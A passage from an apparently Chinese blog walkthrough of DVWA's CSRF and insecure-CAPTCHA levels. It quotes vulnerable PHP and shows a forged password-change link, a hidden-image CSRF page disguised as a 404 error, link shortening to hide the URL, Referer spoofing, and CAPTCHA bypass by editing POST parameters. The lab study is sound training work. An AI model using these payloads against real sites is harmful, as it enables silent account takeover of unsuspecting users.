class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>&#123;        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这个修改密码竟然是$_GET请求，说明密码会在url上显示。如果用户点击以下链接，他的密码就会改成123。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#</span><br></pre></td></tr></table></figure><p>可以用短链接的方法隐藏真实的URL，这样就不容易从链接上看出来修改了密码。</p><p>也可以制造一个攻击页面。在本机做一个页面getf.html处理</p><p>Getf.html页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.137.146/dvwa/vulnerabilities/csrf/?password_new=abc&amp;password_conf=abc&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">0</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>not found<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>把上面链接放在公网某个地址，当用户点击这个链接后，客户可能以为访问了一个失效页面，这样就神不知鬼不觉地修改了用户密码。</p><h2 id="5-2-CSRF-中"><a href="#5-2-CSRF-中" class="headerlink" title="5.2 CSRF[中]"></a>5.2 CSRF[中]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Checks the http referer header</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="title function_ invoke__">eregi</span> ( <span class="string">&quot;127.0.0.1&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>] ) )&#123;</span><br><span class="line">    </span><br><span class="line">            <span class="comment">// Turn requests into variables</span></span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">            <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>)&#123;</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">                <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">                <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            <span class="keyword">else</span>&#123;        </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>eregi()函数在一个字符串搜索指定的模式的字符串。搜索不区分大小写。源码意思是验证HTTP_REFERER是否是127.0.0.1，判断请求的来源是否是本机，可以通过Burp Suite抓包，然后修改Reffer的值，只要包含127.0.0.1就可以实现修改，甚至可以只是127.0.0.1这个值。</p><h2 id="5-3-CSRF-高"><a href="#5-3-CSRF-高" class="headerlink" title="5.3 CSRF[高]"></a>5.3 CSRF[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">            </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Change&#x27;</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">        <span class="comment">// Turn requests into variables</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_current&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sanitise current password input</span></span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">stripslashes</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        <span class="variable">$pass_curr</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_curr</span> );</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Check that the current password is correct</span></span><br><span class="line">        <span class="variable">$qry</span> = <span class="string">&quot;SELECT password FROM `users` WHERE user=&#x27;admin&#x27; AND password=&#x27;<span class="subst">$pass_curr</span>&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$qry</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>) &amp;&amp; ( <span class="variable">$result</span> &amp;&amp; <span class="title function_ invoke__">mysql_num_rows</span>( <span class="variable">$result</span> ) == <span class="number">1</span> ))&#123;</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">            <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;admin&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">                        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;        </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">else</span>&#123;        </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;</span>;            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这个在修改密码前要输入原密码，如果不知道原密码，就不能搞了。</p><h1 id="6-CAPTCHA"><a href="#6-CAPTCHA" class="headerlink" title="6. CAPTCHA"></a>6. CAPTCHA</h1><h2 id="6-1-不安全验证码-低"><a href="#6-1-不安全验证码-低" class="headerlink" title="6.1 不安全验证码[低]"></a>6.1 不安全验证码[低]</h2><p>CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。 简单来说是验证码的意思。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reCAPTCHA API key NULL in config file.</span><br><span class="line"></span><br><span class="line">Please register for a key from reCAPTCHA at [https://www.google.com/recaptcha/admin/create](http://hiderefer.com/?https://www.google.com/recaptcha/admin/create) and set the key in the file /owaspbwa/dvwa-svn/config/config.inc.php    </span><br></pre></td></tr></table></figure><p>进入这个页面要很长时间，我猜是因为它去访问谷歌拿验证码了。它说要去 <a href="http://hiderefer.com/?https://www.google.com/recaptcha/admin/create">https://www.google.com/recaptcha/admin/create</a> 注册密钥再把它放进服务器目录 /owaspbwa/dvwa-svn/config/config.inc.php 里。由于没有科学上网，我就不弄了。</p><p>先来看下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span> (<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes. &lt;br /&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_new</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_conf</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&quot;</span>;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Both passwords must match &lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;2&#x27;</span> ) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$pass_new</span> != <span class="variable">$pass_conf</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;Both passwords must match&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">               <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">               <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">               <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>很清楚看到，整个修改密码过程分为两步，第一步是验证验证码是否正确，第二步是修改密码。我们可以通过抓包直接将step修改为2跳过验证。</p><h2 id="6-2-不安全验证码-中"><a href="#6-2-不安全验证码-中" class="headerlink" title="6.2 不安全验证码[中]"></a>6.2 不安全验证码[中]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_new</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_new&#x27;</span>];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password_conf&#x27;</span>];</span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(<span class="variable">$_DVWA</span>[<span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_challenge_field&quot;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&quot;recaptcha_response_field&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$resp</span>-&gt;is_valid) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes. &lt;br /&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_new</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;&quot;</span> . <span class="variable">$pass_conf</span> . <span class="string">&quot;\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;hidden\&quot; name=\&quot;passed_captcha\&quot; value=\&quot;true\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;&quot;</span>;</span><br><span class="line">            &#125;    </span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Both passwords must match &lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[<span class="string">&#x27;Change&#x27;</span>] ) &amp;&amp; ( <span class="variable">$_POST</span>[<span class="string">&#x27;step&#x27;</span>] == <span class="string">&#x27;2&#x27;</span> ) ) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$_POST</span>[<span class="string">&#x27;passed_captcha&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;You have not passed the CAPTCHA. Bad hacker, no doughnut.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="variable">$pass</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span>))&#123;</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$pass_new</span>);</span><br><span class="line">               <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$pass_new</span>);</span><br><span class="line"></span><br><span class="line">               <span class="variable">$insert</span>=<span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">               <span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$insert</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;</span>;</span><br><span class="line">               <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>在第二步可以看到多了一个if语句用来验证验证码，要求 $_POST[‘passed_captcha’]为真。只要在修改包的时候多添加一个参数passed_captcha=true即可。</p><h2 id="6-3-不安全验证码-高"><a href="#6-3-不安全验证码-高" class="headerlink" title="6.3 不安全验证码[高]"></a>6.3 不安全验证码[高]</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 